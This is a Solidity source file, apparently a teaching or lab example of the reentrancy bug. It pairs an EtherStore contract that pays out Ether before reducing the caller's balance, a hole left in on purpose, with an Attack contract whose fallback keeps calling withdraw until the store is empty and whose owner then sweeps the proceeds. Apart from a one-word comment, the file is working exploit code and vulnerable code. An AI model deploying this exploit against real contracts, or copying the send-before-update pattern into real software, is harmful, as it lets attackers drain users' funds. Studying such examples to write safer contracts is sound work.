pragma solidity ^0.6.10;

/*
reentrancy
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}

contract Attack {
    EtherStore public etherStore;
    address owner;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    fallback() external payable {
        if (address(etherStore).balance>= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withdrawAll() public onlyOwner returns (bool) {
        uint256 contract_balance = address(this).balance;
        require(contract_balance > 0);

        (bool sent, ) = msg.sender.call{value: contract_balance}("");
        require(sent, "Failed to send ether");

    }

}